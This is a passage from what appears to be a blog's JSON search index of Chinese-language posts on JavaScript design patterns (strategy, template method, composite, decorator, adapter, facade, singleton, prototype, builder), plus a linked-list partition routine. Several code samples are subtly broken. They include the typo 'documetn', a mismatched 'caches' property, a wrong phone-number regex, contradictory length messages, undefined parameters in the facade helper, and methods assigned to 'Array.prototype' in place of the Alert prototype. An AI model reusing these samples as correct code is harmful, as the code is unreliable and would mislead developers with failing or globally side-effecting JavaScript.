&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[{"name":"手撕代码","slug":"手撕代码","permalink":"https://coloey.github.io/tags/%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/tags/JavaScript/"}]},{"title":"策略模式","slug":"策略模式","date":"2022-05-19T13:25:01.000Z","updated":"2022-08-23T01:52:45.193Z","comments":true,"path":"2022/05/19/策略模式/","link":"","permalink":"https://coloey.github.io/2022/05/19/%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"策略模式指的是定义一系列算法，把他们一个个封装起来，目的就是将算法的使用和算法的实现分离开来。stragey就是值为函数的变量，同时它还可以用来封装一系列的规则，比如常见的表单验证规则，只要这些规则指向的目标一致，并且可以被替换使用，那么就可以用策略模式来封装它们。 优点 算法可以自由切换，避免了使用多层条件判断，增加了扩展性 缺点 策略类增多，所有策略类都需要对外暴露。 例子 写表单验证经常无止境的if…else写法，意识到这种写法不靠谱，于是我把检验规则放在一个对象中，在函数中对它进行控制，把规则与实现进行了分离，每次只需要在封装的规则中去修改配置。在后面的多种场景都用这种方法，解决了频繁使用if…else的问题，当第一次接触倒策略模式才知道这种写法也算策略模式。 123456789101112131415161718192021222324252627282930const rules = &#123; cover_img: &#123; must: false, msg: &#x27;请上传封面图片&#x27;, val: &#x27;&#x27; &#125;, name: &#123; must: true, msg: &#x27;姓名不能为空&#x27;, val: &#x27;&#x27; &#125;, sex: &#123; must: true, msg: &#x27;请填写性别&#x27;, val: &#x27;&#x27; &#125;, birthday: &#123; must: false, msg: &#x27;请选择生日&#x27;, val: &#x27;&#x27; &#125;,&#125;function verify()&#123; for(const key in rules)&#123; if(rules[key].must&amp;&amp;!rules[key].val)&#123; console.log(rules[key].msg) &#125; &#125;&#125;verify() 对于分支语句的优化，工厂方法模式，状态模式，策略模式。 表单验证例子：高阶函数 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;form action=&quot;http://xxx.com/register&quot; id=&quot;registerForm&quot; method=&quot;post&quot;&gt; 请输入用户名:&lt;input type=&quot;text&quot; name=&quot;userName&quot;&gt;&lt;/input&gt; 输入密码:&lt;input type=&quot;text&quot; name=&quot;password&quot;&gt; 输入手机号码:&lt;input type=&quot;text&quot; name=&quot;phoneNumber&quot;&gt; &lt;button&gt;提交&lt;/button&gt; &lt;/form&gt; &lt;script&gt; //策略对象 let strategies = &#123; isNonEmpty:function(value,errorMsg)&#123; if(value===&#x27;&#x27;)&#123; return errorMsg &#125; &#125;, minLength:function(value,length,errorMsg)&#123; if(value.length&lt;length)&#123; return errorMsg &#125; &#125;, isMobile:function(value,errorMsg)&#123; if(!/(^1[3][5][8][0-9]&#123;9&#125;$)/.test(value))&#123; return errorMsg &#125; &#125; &#125; //客户调用代码 let registerForm = documetn.getElementById(&#x27;registerForm&#x27;) let validatorFunc = function()&#123; let validator = new Validator() validator.add(registerForm.userName,[&#123; strategy:&#x27;isNonEmpty&#x27;, errorMsg:&#x27;用户名不为空&#x27; &#125;,&#123; strategy:&#x27;minLength:6&#x27;, errorMsg:&#x27;用户名长度不能小于10位&#x27; &#125;]); validator.add(registerForm.password,[&#123; strategy:&#x27;minLength:6&#x27;, errorMsg:&#x27;用户长度不能小于10位&#x27; &#125;]) validator.add(registerForm.phoneNumber,[&#123; strategy:&#x27;isMobile&#x27;, errorMsg:&#x27;手机号码格式不正确&#x27; &#125;]) &#125; //验证类 Validator = function()&#123; this.cache=[]; &#125; Validator.prototype.add = function(dom,rules)&#123; var self = this for(let i=0,rule;rule = rules[i++];)&#123; let self = this (function(rule)&#123; let strategyAry = rule.strategy.split(&#x27;:&#x27;) let errorMsg = rule.errorMsg self.cache.push(function()&#123; let strategy = strategyAry.shift() strategyAry.unshift(dom.value) strategyAry.push(errorMsg) return strategies[strategy].apply(dom,strategyAry) &#125;) &#125;)(rule) &#125; &#125; Validator.prototype.start = function()&#123; for(let i=0,validatorFunc;validatorFunc = this.caches[i++];)&#123; let errorMsg = validatorFunc() if(errorMsg)&#123; return errorMsg &#125; &#125; &#125; &lt;/script&gt; 工厂方法模式：是一种创建型模式，最终目的是创建对象 状态模式和策略模式都是行为性模式，在状态模式中，核心是对状态的控制来决定表现行为，所以状态之间通常不能相互替代，否则将产生不同的行为结果。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"模板方法模式","slug":"模板方法模式","date":"2022-05-19T11:42:49.000Z","updated":"2022-05-19T11:54:51.486Z","comments":true,"path":"2022/05/19/模板方法模式/","link":"","permalink":"https://coloey.github.io/2022/05/19/%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"模板方法的核心在于对方法的重用，它将核心方法封装在基类中，让子类继承基类的方法，实现基类方法的共享，达到方法的共用，当然这种设计模式将导致基类控制子类必须遵守某些法则，这是一种行为的约束，但是为了让行为的约束更加可靠，基类中封装的方法通常是不变的算法，或者具有稳定的调用方式。 子类继承的方法也可以扩展，要求对基类继承的方法进行重写 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131//模板类 基础提示框data渲染数据var Alert=function(data)&#123; if(!data)return; //设置内容 this.content=data.content; //创建提示面板 this.panel=document.createElement(&#x27;div&#x27;); //创建内容提示组件 this.contentNode=document.createElement(&#x27;p&#x27;); //创建确定按钮组件 this.confirmBtn=document.createElement(&#x27;span&#x27;); //创建关闭按钮组件 this.closeBtn=document.createElement(&#x27;b&#x27;); //为提示面板添加类 this.panel.className=&#x27;alert&#x27;; //为关闭按钮添加类 this.closeBtn.className=&#x27;a-close&#x27;; //为确定按钮添加类 this.confirmBtn.className=&#x27;a-confirm&#x27;; //为确定按钮添加文案 this.confirmBtn.innerHTML=data.confirm||&#x27;确认&#x27; //为提示内容添加文本 this.contentNode.innerHTML=this.content; //点击确定按钮执行方法 如果data中有success方法则为success方法，否则为空函数 this.success=data.success||function()&#123;&#125;; //点击关闭按钮执行方法 this.fail=data.fail||function()&#123;&#125;&#125;Array.prototype=&#123; init:function()&#123; //生成提示框 this.panel.appendChild(this.closeBtn); this.panel.appendChild(this.contentNode); this.panel.appendChild(this.confirmBtn); //插入页面 document.body.appendChild(this.panel); //绑定事件 this.bindEvent(); //显示提示框 this.show(); &#125;, bindEvent:function()&#123; var me=this; //关闭按钮点击事件 this.closeBtn.onclick=function()&#123; me.fail(); //隐藏弹层 me.hide() &#125; //确认按钮点击事件 this.confirmBtn.onclick=function()&#123; me.success(); me.hide(); &#125; &#125;, hide:function()&#123; this.panel.style.display=&#x27;none&#x27; &#125;, //显示弹层 show:function()&#123; this.panel.style.display=&#x27;block&#x27; &#125;&#125;//右侧按钮提示框var RightAlert=function(data)&#123; //继承基本提示框构造函数 Alert.call(this,data); //为确认按钮添加right类 this.confirmBtn.className=this.confirmBtn.className+&#x27;right&#x27;&#125;//继承基本提示框方法RightAlert.prototype=new Alert();//标题提示框var TitleAlert=function(data)&#123; Alert.call(this,data); this.title=data.title; this.titleNode=document.createElement(&#x27;h3&#x27;); this.titleNode.innerHTML=this.title&#125;TitleAlert.prototype=new Alert();//对基本提示框创建方法的拓展TitleAlert.prototype.init=function()&#123; //插入标题 this.panel.insertBefore(this.titleNode,this.panel.firstChild); //继承基本提示框的init方法 Alert.prototype.init.call(this)&#125;//带有取消按钮的弹出框var CancleAlert=function(data)&#123; //继承标题提示框构造函数 TitleAlert.call(this,data) //取消按钮文案 this.cancel=data.cancel; //创建取消按钮 this.cancelBtn=document.createElement(&#x27;span&#x27;); //为取消按钮添加类 this.cancelBtn.className=&#x27;cancel&#x27; //设置取消按钮内容 this.cancelBtn.innerHTML=this.cancel||&#x27;取消&#x27;&#125;//继承标题提示框原型方法CancleAlert.prototype=new Alert()CancleAlert.prototype.init=function()&#123; //继承标题提示框创建方法 TitleAlert.prototype.init.call(this); //由于取消按钮要添加在末尾，所以在创建完其他组件后添加 this.panel.appendChild(this.cancelBtn)&#125;CancleAlert.prototype.bindEvent=function()&#123; var me=this; //标题提示框绑定事件方法继承 TitleAlert.prototype.bindEvent.call(me); //取消按钮绑定事件 this.cancelBtn.onclick=function()&#123; me.fail(); me.hide(); &#125;&#125;new CancleAlert(&#123; title:&#x27;提示标题&#x27;, content:&#x27;提示内容&#x27;, success:function()&#123; console.log(&#x27;ok&#x27;) &#125;, fail:function()&#123; console.log(&#x27;cancel&#x27;) &#125;&#125;).init()","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"组合模式","slug":"组合模式","date":"2022-05-16T03:12:05.000Z","updated":"2022-09-01T15:24:13.734Z","comments":true,"path":"2022/05/16/组合模式/","link":"","permalink":"https://coloey.github.io/2022/05/16/%E7%BB%84%E5%90%88%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"组合模式能够给我们提供一个清晰的组成结构，组合对象类通过集成同一个父类使其具有统一的方法，方便我们统一管理和使用。 组合模式用途： 组合模式将对象组合成树形结构，以表示“部分-整体”的层次结构，除了用来表示树形结构外，组合模式可以通过对象的多态性表示，使得用户对单个对象和组合对象的使用具有一致性 请求在树中传递，从树最顶端往下传，如果当前处理请求的对象是叶对象（普通子命令），叶对象会对请求做出相应处理，如果当前处理请求是组合对象，组合对象则会遍历它属下的子节点，将请求继续传递给子节点。 例子1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;body&gt; &lt;button id=&quot;button&quot;&gt;按我&lt;/button&gt; &lt;script&gt; let MacroCammond = function()&#123; return&#123; commandList:[], add: function(command)&#123; this.commandList.push(command) &#125;, execute: function()&#123; for(let i = 0,command;command = this.commandList[i++];)&#123; command.execute() &#125; &#125; &#125; &#125;; // let openAcCommand = &#123; execute: function()&#123; console.log(&#x27;打开空调&#x27;) &#125; &#125; let openTvCommand = &#123; execute: function()&#123; console.log(&#x27;打开电视&#x27;) &#125; &#125; let macroCommand1 = MacroCammond() macroCommand1.add(openAcCommand) macroCommand1.add(openTvCommand) // let closeDoorCommand = &#123; execute:function()&#123; console.log(&#x27;关门&#x27;) &#125; &#125; let openComputer = &#123; execute: function()&#123; console.log(&#x27;开电脑&#x27;) &#125; &#125; let macroCommand2 = MacroCammond() macroCommand2.add(closeDoorCommand) macroCommand2.add(openComputer) //现在所有命令组合在一起为一个超级命令 let macroCommand = MacroCammond() macroCommand.add(macroCommand1) macroCommand.add(macroCommand2) //绑定超级命令 let setCommand = (function(command)&#123; document.getElementById(&#x27;button&#x27;).onclick = function()&#123; command.execute() &#125; &#125;)(macroCommand) &lt;/script&gt; &lt;/body&gt; 注意： 组合模式不是父子关系 组合模式是一种HAS-A(聚合)关系，而不是IS-A，组合对象包含一组叶对象，但是leaf不是Composite的子类，组合对象把请求委托给它包含的叶子结点，它们能合作的关键是拥有相同的接口。 对叶子操作的一致性： 组合模式除了要求组合对象和叶对象拥有相同的接口外，还有一个必要条件，就是对一组叶对象的操作必须具有一致性 双向映射性： 给父结点和子结点建立双向映射关系，例如给父对象和叶子分别添加集合保存对方的引用，但是，相互之间的引用1过于复杂时会引使得对象之间产生过多耦合性，可以引入中介者模式管理对象 组合模式适用情况： 表示对象的部分-整体层次结构，组合模式可以很方便地构造一棵树来表示对象的部分-整体结构，特别是开发期间不确定这棵树存在多少层次的时候，在树的构造最终完成之后，只需要通过请求树的最顶层对象，就能对树做统一的操作。在组合模式中增加和删除结点很方便，符合“开放-封闭”原则 客户希望统一对待树中所有对象。组合模式可以使客户忽略对象和叶对象的区别，客户在面对这棵树时，不用关心正在处理的对象时组合对象还是叶对象，也就是不用写一堆if,else组合对象和叶对象会各自做正确的事情。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"划分链表","slug":"划分链表","date":"2022-05-15T16:23:16.000Z","updated":"2022-05-15T16:34:36.382Z","comments":true,"path":"2022/05/16/划分链表/","link":"","permalink":"https://coloey.github.io/2022/05/16/%E5%88%92%E5%88%86%E9%93%BE%E8%A1%A8/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344var ListPartition=(head,pivot)=&gt;&#123; let sH=null,sT=null,eH=null,eT=null,mH=null,mT=null; let next=null; while(head!==null)&#123; next=head.next; head.next=null; if(head.value&lt;pivot)&#123; if(sH===null)&#123; sH=head; sT=head; &#125;else&#123; sT.next=head; sT=head; &#125; &#125;else if(head.value===pivot)&#123; if(eH===null)&#123; eH=head; eT=head; &#125;else&#123; eT.next=head; eT=head; &#125; &#125;else&#123; if(mH==null)&#123; mH=head; mT=head; &#125;else&#123; mT.next=head; mT=head; &#125; &#125; head=next; &#125; if(sT!==null)&#123;//如果有小于区域 sT.next=eH; eT=eT===null?sT:eT;//下一步谁连大于区域的头谁就是eT &#125; if(eT!==null)&#123;//小于区域和等于区域不是都没有 eT.next=mH; &#125; return sH!==null?sH:(eH!==null?eH:mH) &#125;","categories":[{"name":"算法","slug":"算法","permalink":"https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/"},{"name":"链表","slug":"算法/链表","permalink":"https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/%E9%93%BE%E8%A1%A8/"}],"tags":[]},{"title":"桥接模式","slug":"桥接模式","date":"2022-05-14T02:58:44.000Z","updated":"2022-05-14T03:17:04.635Z","comments":true,"path":"2022/05/14/桥接模式/","link":"","permalink":"https://coloey.github.io/2022/05/14/%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"桥接模式：在系统沿着多个维度变化的同时，又不增加其复杂度并达到解耦 提取共同点 1234567891011121314//抽象处公共部分function changeColor(dom,color,bg)&#123; //设置元素的字体颜色 dom.style.color=color //设置元素的背景颜色 dom.style.background=bg&#125;var spans=document.getElementsByTagName(&#x27;span&#x27;)spans[0].onmouseover=function()&#123;//匿名函数作为回调函数作为桥接方法，解除this和事件之间的耦合，changeColor方法中的dom实质上是事件回调函数中的this changeColor(this,&#x27;red&#x27;,&#x27;#ddd&#x27;)&#125;spans[0].onmouseout=function()&#123; changeColor(this,&#x27;#333&#x27;,&#x27;#f5f5f5&#x27;)&#125; 桥接模式最主要特点就是将实现层（如元素绑定的事件）与抽象层（如修饰页面UI逻辑）解耦分离，使两部分可以独立变化，桥接模式主要是针对结构之间的结构，而抽象工厂模式和创建者模式主要业务在于创建。通过桥接模式实现的解耦，使实现层和抽象层分开处理，避免需求的改变造成对象内部的修改。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"装饰器模式","slug":"装饰器模式","date":"2022-05-14T01:57:53.000Z","updated":"2022-08-28T08:44:16.791Z","comments":true,"path":"2022/05/14/装饰器模式/","link":"","permalink":"https://coloey.github.io/2022/05/14/%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"装饰器模式是在对原有功能的基础上对功能拓展的模式，能够在不改变对象自身的基础上，在程序运行期间给对象动态增添职责 为输入框增加新功能 12345678910111213141516171819202122232425262728//装饰者var decorator=function(input,fn)&#123; //获取事件源 var input=document.getElementById(input) //若事件源已经绑定事件 if(typeof input.onclick===&#x27;function&#x27;)&#123; //缓存事件原有回调函数 var oldClickFn=input.onclick input.onclick=function()&#123; //事件原有回调函数 oldClickFn() //执行事件新增回调函数 fn() &#125; &#125;else&#123; //事件源未绑定事件，直接为事件源添加新增回调函数 input.onclick=fn &#125;&#125;//电话输入框功能装饰decorator(&#x27;tel_input&#x27;,function()&#123; document.getElementById(&#x27;tel_demo_text&#x27;).style.display=&#x27;none&#x27;&#125;)//姓名输入框功能装饰decorator(&#x27;name_input&#x27;,function()&#123; document.getElementById(&#x27;name_demo_text&#x27;).style.display=&#x27;none&#x27;&#125;) 装饰链： 1234567891011121314151617181920212223let plane =&#123; fire:function()&#123; console.log(&#x27;发射普通子弹&#x27;) &#125; &#125; let missileDecorator = function () &#123; console.log(&#x27;发射导弹&#x27;) &#125; let atomDecorator = function()&#123; console.log(&#x27;发射原子弹&#x27;) &#125; let fire1 = plane.fire plane.fire=function()&#123; fire1() missileDecorator() &#125; let fire2 = plane.fire plane.fire = function()&#123; fire2() atomDecorator() &#125; plane.fire()//发射普通子弹 发射导弹 射原子弹 AOP装饰函数：12345678910111213141516171819Function.prototype.before = function(beforefn)&#123; let _self = this//保存原函数的引用 return function()&#123;//返回包含了原函数和新函数的代理函数 beforefn.apply(this,arguments)//执行新函数，且保证this不被劫持，新函数接受的参数也会被原封不动地传入原函数，新函数在原函数之前执行 return _self.apply(this,arguments)//执行原函数并返回原函数的执行结果，并且保证this不被劫持 &#125; &#125; Function.prototype.after = function(afterfn)&#123; let _self = this return function()&#123; let ret = _self.apply(this,arguments) afterfn.apply(this,arguments) return ret &#125; &#125; document.getElementById= document.getElementById.before(function()&#123; alert(1) &#125;) let button = document.getElementById(&#x27;button&#x27;) 应用：数据统计上报：把行为依照职责分成细粒度更细的函数，通过装饰把它们合并到一起，有助于编写一个松耦合高复用得到系统 1234567891011121314151617Function.prototype.after = function(afterfn)&#123; let _self = this return function()&#123; let ret = _self.apply(this,arguments) afterfn.apply(this,arguments) return ret &#125;&#125; let showLogin = function()&#123; console.log(&#x27;打开登录浮层&#x27;) &#125; let log = function()&#123; console.log(&#x27;上报标签为:&#x27;+this.getAttribute(&#x27;tag&#x27;)) &#125; showLogin = showLogin.after(log)//打开浮层后上报数据 document.getElementById(&#x27;button&#x27;).onclick = showLogin 动态改变参数1234567891011//动态改变参数 let ajax = function(type,url,param)&#123; console.log(param) &#125; let getToken = function()&#123; return &quot;Token&quot; &#125; ajax = ajax.before(function(type,url,param)&#123; param.Token = getToken() &#125;) ajax(&#x27;get&#x27;,&#x27;http://xxx.com&#x27;,&#123;name:&#x27;seven&#x27;&#125;) 用AOP的方式给ajax函数动态装饰上Token参数，保证了ajax函数是一个相对纯净的函数，提高了ajax函数的复用性。 表单验证123456789101112131415161718192021222324252627282930//表单验证 let validate = function()&#123; if(username.value === &#x27;&#x27;)&#123; alert(&#x27;用户名不能为空&#x27;) return false &#125; if(password.value === &#x27;&#x27;)&#123; alert(&#x27;密码不为空&#x27;) return false &#125; &#125; Function.prototype.before = function(beforefn)&#123; let _self = this return function()&#123; if(beforefn.apply(this,arguments)===false)&#123; return ; &#125; return _self.apply(this,arguments) &#125; &#125; let formSubmit = function()&#123; let param =&#123; username:username.value, password:password.value &#125; ajax(&#x27;http://xxx.com/login&#x27;,param) &#125; formSubmit=formSubmit.before(validate) let submit = document.getElementById(&#x27;submitBtn&#x27;) submit.onclick=function () &#123;formSubmit()&#125; 代理模式和装饰者模式区别：目的不同：代理模式的目的是当直接访问本体不方便或者不符合需要的时候，为这个本体提供一个替代者，本体定义关键功能，代理提供或拒绝对它的访问，这种关系一开始就可以被确定。装饰者模式用于一开始无法确定对象的全部功能。 形式:代理模式只有一层代理-本体的引用，而装饰者模式是会形成一条长长的装饰链","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"适配器模式","slug":"适配器模式","date":"2022-05-12T15:39:04.000Z","updated":"2022-05-12T15:55:29.472Z","comments":true,"path":"2022/05/12/适配器模式/","link":"","permalink":"https://coloey.github.io/2022/05/12/%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"JQuey适配器 如果A框架和jQuery很像我，直接用适配器适配两种代码库中不兼容的代码，window.A=A=jQuery 参数适配器 当传递多个参数，记住参数顺序比较困难，所有我们经常以一个参数对象方式传入，调用它的时候又不知道传递的参数是否完整，如果有一些参数没有传入，一些参数是有默认值的等等，此时用适配器传入这个参数对象 1234567891011121314function doSomething(obj)&#123; var _adapter=&#123; name:&#x27;lala&#x27;, title:&#x27;设计模式&#x27;, age:24, color:&#x27;pink&#x27;, size:100, prize:50 &#125; for(var i in _adapter)&#123; _adapter[i]=obj[i]||_adapter[i] &#125; &#125; 数据适配 var arr=[‘JavaScript’,’book’,’前端编程’] 这种数据结构语义不好，通常会适配成对象形式，比如： 12345678910function arrToObjAdapter(arr)&#123; return &#123; name:arr[0], type:arr[1], title:arr[2] &#125;&#125;var adapterData=arrToObjAdapter(arr)console.log(adapterData) 服务器端数据适配 如果后端因为架构改变导致传递的数据结构发生变化，我们只需要写个适配器将传递过来的数据适配成对我们可用的数据再使用 12345678910111213function ajaxAdapter(data)&#123; //处理数据并返回数据 return [data[&#x27;key1&#x27;],data[&#x27;key2&#x27;],data[&#x27;key3&#x27;]]&#125;$.ajax(&#123; url:&#x27;someAddress.php&#x27;, success:function(data,status)&#123; if(data)&#123; //使用适配器后的数据——返回的对象 doSomething(ajaxAdapter(data)) &#125; &#125;&#125;)","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"外观模式","slug":"外观模式","date":"2022-05-12T14:26:08.000Z","updated":"2022-05-12T16:23:00.209Z","comments":true,"path":"2022/05/12/外观模式/","link":"","permalink":"https://coloey.github.io/2022/05/12/%E5%A4%96%E8%A7%82%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"外观模式：为一组复杂的子系统接口提供一个更高级的统一接口，通过这个接口使得对子系统接口的访问更容易，在javaScript中用于对底层结构兼容性做统一封装来简化用户使用 兼容性优化：12345678910111213141516171819202122232425262728293031323334353637383940414243function addEvent(dom,type,fn)&#123; //支持DOM2的事件处理程序addEventListener方法的浏览器 if(dom.addEventListener)&#123; dom.addEventListener(type,fn,false); //对于addEventListener方法但支持attachEvent方法的浏览器 &#125;else if(dom.attachEvent)&#123; dom.attachEvent(&#x27;on&#x27;+type,fn) //对于不支持addEventListener方法也不支持attachEvent方法，但支持&#x27;on+事件名&#x27;的浏览器 &#125;else&#123; dom[&#x27;on&#x27;+type]=fn &#125;&#125;//获取事件对象var getEvent=function(event)&#123; return event||window.event&#125;//获取元素var getTarget=function(event)&#123; var event=getEvent(event) //标准浏览器下event.target，IE下event.srcElement return event.target||event.srcElement&#125;//阻止默认行为var preventDefault=function(event)&#123; var event=getEvent(event) //标准浏览器 if(event.preventDefault)&#123; event.preventDefault() //IE浏览器 &#125;else&#123; event.returnValue=false; &#125;&#125;;addEvent(myInput,&#x27;click&#x27;,function(e)&#123; preventDefault(e) //获取事件源目标对象 if(getTarget(e)!==document.getElementById(&#x27;myInput&#x27;))&#123; hideInputSug() &#125;&#125;) 对接口方法的外层包装123456789101112131415161718192021222324var A=&#123; //通过id获取元素 g:function(id)&#123; return document.getElementById(id) &#125;, //设置元素css属性 css:function(id,key,value)&#123; document.getElementById(id).style[key]=value &#125;, //设置元素的属性 attr:function(id,key,value)&#123; document.getElementById(id)[key]=value &#125;, html:function()&#123; document.getElementById(id).innerHTML=html &#125;, //为元素绑定事件 on:function()&#123; document.getElementById(id)[&#x27;on&#x27;+type]=fn &#125;&#125;A.css(&#x27;box&#x27;,&#x27;background&#x27;,&#x27;red&#x27;)//设置css样式A.attr(&#x27;box&#x27;,&#x27;className&#x27;,&#x27;box&#x27;)//设置classA.html(&#x27;box&#x27;,&#x27;这是新添加的内容&#x27;)//设置内容","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"单例模式","slug":"单例模式","date":"2022-05-12T13:29:46.000Z","updated":"2022-08-23T01:37:51.784Z","comments":true,"path":"2022/05/12/单例模式/","link":"","permalink":"https://coloey.github.io/2022/05/12/%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"创建代码库单例模式是一个只允许实例化一次的对象类，有时这么做是为了节省系统资源，javaScript中单例模式经常会作为命名空间对象来实现，通过单例对象可以将各个模块的代码井井有条的梳理在一起，减少使用全局变量 123456789101112131415161718192021222324var A=&#123; Util:&#123; util_method1:function()&#123;&#125;, util_method2:function()&#123;&#125; //... &#125;, Tool:&#123; tool_method1:function()&#123;&#125;, tool_method2:function()&#123;&#125; //... &#125;, Ajax:&#123; get:function()&#123;&#125;, post:function()&#123;&#125; //... &#125;, others:&#123; //... &#125;&#125;A.Util.util_method1()A.Tool.tool_method1()A.Ajax.get() 单例模式管理静态变量静态变量：只能访问不能修改并且创建后就能使用，为了实现创建后就能使用这一需求，我们需要让创建的函数执行一次，我们创建的对象内保存着静态变量通过取值器访问，最后将这个对象作为一个单例放在全局空间里作为静态变量单例对象供他人使用，闭包封装私有变量 123456789101112131415var Conf=(function()&#123; var conf=&#123; MAX_NUM:100, MIN_NUM:1, COUNT:1000 &#125; //返回取值器对象 return &#123; get: function(name)&#123; return conf[name]?conf[name]:null; &#125; &#125;&#125;)()var count=Conf.get(&#x27;COUNT&#x27;)console.log(count)//1000 惰性单例在需要的时候才创建对象实例 12345678910111213141516171819//惰性单例let getSingle=function(fn)&#123; let res; return function()&#123; return res || (res = fn.apply(this,arguments)) &#125;&#125;let createLoginLayer = function()&#123; let div = document.getElementById(&#x27;div&#x27;) div.innerHTML = &quot;我是登录浮窗&quot; div.style.display=&#x27;none&#x27; document.body.appendChild(div) return div&#125;let createSingleLoginLayer = getSingle(createLoginLayer)document.getElementById(&#x27;loginBtn&#x27;).onclick = function()&#123; let loginLayer = createSingleLoginLayer() loginLayer.style.display=&#x27;block&#x27;&#125; res在闭包中，因此永远不会被销毁，在将来的请求中如果res被赋值就直接返回这个值","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"原型模式","slug":"原型模式-1","date":"2022-05-12T09:58:50.000Z","updated":"2022-05-12T13:30:13.652Z","comments":true,"path":"2022/05/12/原型模式-1/","link":"","permalink":"https://coloey.github.io/2022/05/12/%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F-1/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334//图片轮播类var LoopImages=function(ImgArr,container)&#123; this.ImgArr=ImgArr;//轮播图片数组 this.container=container//轮播图片容器&#125;LoopImages.prototype=&#123; //创建轮播图片 createImg:function()&#123; console.log(&#x27;LoopImages createImage function&#x27;) &#125;, changeImage:function()&#123; console.log(&#x27;LoopImages changeImage function&#x27;) &#125;&#125;//上下切换滑动类var SlideLoopImg=function(imgArr,container)&#123; //构造函数继承图片轮播类 LoopImages.call(this,imgArr,container)&#125;SlideLoopImg.prototype=new LoopImages()//重写继承的切换下一张图片的方法SlideLoopImg.prototype.changeImage=function()&#123; console.log(&#x27;SlideLoopImage changeImage function&#x27;)&#125;//渐隐切换类var FadeLoopImg=function(imgArr,container,arrow)&#123; LoopImages.call(this,imgArr,container) this.arrow=arrow&#125;FadeLoopImg.prototype=new LoopImages()FadeLoopImg.prototype.changeImage=function () &#123; console.log(&#x27;FadeLoopImage changeImage function&#x27;)&#125; 父类将简单的属性放在构造函数中，将复杂的方法放在原型中，子类通过组合继承或者寄生组合继承将父类的方法和属性继承，子类可以将方法重写 需要让每个继承对象独立拥有一份原型对象，或者创建的实例对象的构造函数比较复杂，或者耗时较长，或者通过创建多个对象实现，此时我们最好不用new关键字去复制这些基类，可以通过对这些对象属性和方法进行复制来实现创建，如果涉及多个对象，我们也可以通过原型模式来实现对新对象的创建。首先要有一个原型模式的对象复制方法 基于已经存在的模板对象克隆新对象的模式 argument[0],arguments[1]…参数1，参数2…表示模板对象 这里对模板引用是浅复制，也可以根据需求深复制 1234567891011121314151617181920212223242526272829303132333435363738function prototypeExtend()&#123; var F=function () &#123; &#125;,//缓存类，为实例化返回对象临时创建 args=arguments,//模板对象参数序列 i=0, len=args.length; for(;i&lt;len;i++)&#123; //遍历每个模板对象中的属性 for(var j in args[i])&#123; //将这些属性复制到缓存类原型中 F.prototype[j]=args[i][j] &#125; &#125; //返回缓存类的一个实例 return new F()&#125;var penguin=prototypeExtend( &#123; speed:20, swim:function()&#123; console.log(&#x27;游泳速度&#x27;+this.speed) &#125; &#125;, &#123; run:function(speed)&#123; console.log(&#x27;跑步速度&#x27;+speed) &#125; &#125;, &#123; jump:function()&#123; console.log(&#x27;跳跃动作&#x27;) &#125; &#125;)penguin.swim();//游泳速度 20penguin.run(10)//奔跑速度 10penguin.jump()//跳跃动作","categories":[{"name":"设计模式","slug":"设计模式","permalink":"https://coloey.github.io/categories/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"}],"tags":[]},{"title":"建造者模式","slug":"建造者模式","date":"2022-05-12T08:54:57.000Z","updated":"2022-05-12T09:33:56.419Z","comments":true,"path":"2022/05/12/建造者模式/","link":"","permalink":"https://coloey.github.io/2022/05/12/%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374//创建以为人类var Human=function(param)&#123; this.skill=param&amp;&amp;param.skill||&#x27;保密&#x27;; 